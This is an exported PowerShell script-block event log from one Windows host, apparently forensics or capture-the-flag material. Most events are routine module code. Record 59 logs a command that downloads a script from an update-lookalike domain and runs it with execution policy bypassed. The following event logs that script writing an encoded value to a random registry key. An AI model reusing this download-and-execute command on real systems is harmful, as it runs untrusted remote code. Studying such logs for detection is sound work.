[System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_",
    "ScriptBlockId": "961cd978-8fb5-4f94-aae7-dbef6c97012a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.010924Z"
    },
    "EventRecordID": 47,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-26A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 5,
    "MessageTotal": 5,
    "ScriptBlockText": "methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Unregister-ClusteredScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "961cd978-8fb5-4f94-aae7-dbef6c97012a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.089875Z"
    },
    "EventRecordID": 48,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-28A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "function __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}",
    "ScriptBlockId": "e86e822d-7e29-4e73-ab50-be03ae1d8327",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.405649Z"
    },
    "EventRecordID": 49,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2AA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ @('Daily') -contains $_ }",
    "ScriptBlockId": "b6cc0c4b-efe5-49bb-8072-4d40e585121e",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.414394Z"
    },
    "EventRecordID": 50,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2AA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ @('Logon') -contains $_ }",
    "ScriptBlockId": "15c21c31-7ab7-4f36-9811-764676daee2f",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.417611Z"
    },
    "EventRecordID": 51,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2AA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ @('Once') -contains $_ }",
    "ScriptBlockId": "18fc3cca-7238-433a-88f2-7d2185d94589",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.421272Z"
    },
    "EventRecordID": 52,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2AA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ @('Startup') -contains $_ }",
    "ScriptBlockId": "5347ef8d-1c4c-4587-91b1-7eb9a62fdb81",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.425737Z"
    },
    "EventRecordID": 53,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2AA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ @('Weekly') -contains $_ }",
    "ScriptBlockId": "d7df3c07-c143-42a3-8d3f-5d52a359287f",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.547215Z"
    },
    "EventRecordID": 54,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2CA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
    "ScriptBlockId": "7cae7e94-4a52-4850-8f05-5aa30e346ff0",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.556037Z"
    },
    "EventRecordID": 55,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-2EA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
    "ScriptBlockId": "6b9be9c7-0eae-4d8f-b38f-37dd0abcd380",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.574943Z"
    },
    "EventRecordID": 56,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-30A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
    "ScriptBlockId": "ca90e3ca-04c4-465e-a115-93a3b2ae15fd",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.591462Z"
    },
    "EventRecordID": 57,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-6FA6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
    "ScriptBlockId": "794d9d3f-0d7d-412d-8833-25bfeda6a087",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.615547Z"
    },
    "EventRecordID": 58,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-71A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "$global:?",
    "ScriptBlockId": "877f5957-1125-4e08-9732-9c0bdb9a12ce",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:21.554867Z"
    },
    "EventRecordID": 59,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0003-4BA0-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5064,
      "ThreadID": 4104
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "$downloadUrl = \"http://windowsliveupdater.com/3MZvgfcEiT.ps1\"; $destinationPath = \"$env:TEMP\\3MZvgfcEiT.ps1\"; Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath; Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-ExecutionPolicy Bypass -File $destinationPath\" -Wait",
    "ScriptBlockId": "0d0c674c-1722-4d2b-ab45-c8343914ac2d",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.247197Z"
    },
    "EventRecordID": 63,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-9BA6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Get-PSDrive -Name C -Verbose\nGet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\" -Verbose\n\nNew-Item -Path \"HKCU:\\Software\\cPdQnixceg\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\cPdQnixceg\" -Name \"cPdQnixceg\" -Value \"X1c0c19SM3YzNGwzZH0=\" -PropertyType String\nGet-ScheduledTask -Verbose\n",
    "ScriptBlockId": "72187be7-469a-440d-ac5f-44d1f81d3de5",
    "Path": "C:\\Users\\usr01\\AppData\\Local\\Temp\\3MZvgfcEiT.ps1"
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843371Z"
    },
    "EventRecordID": 64,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "f332cf00-f87e-425e-84dc-dfaa0364d72a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843378Z"
    },
    "EventRecordID": 65,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "8264cf74-6d78-4c58-90ef-5c06865e50e7",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843380Z"
    },
    "EventRecordID": 66,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "8b114243-e45f-48ee-a270-85daa9520963",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843382Z"
    },
    "EventRecordID": 67,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "e16fee28-b5f4-4abd-b8c1-1be9e43772b9",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843384Z"
    },
    "EventRecordID": 68,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "9d5cdd1d-6311-48ad-8ada-3556170066a5",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843391Z"
    },
    "EventRecordID": 69,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "f860b2aa-d5ae-40dd-b80e-f0df80bf1071",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843393Z"
    },
    "EventRecordID": 70,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "2ab73560-2f6e-4dd1-b06f-7b298c43cab4",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843396Z"
    },
    "EventRecordID": 71,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "369e2e5e-416c-43b4-8338-10f6c1df235e",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843398Z"
    },
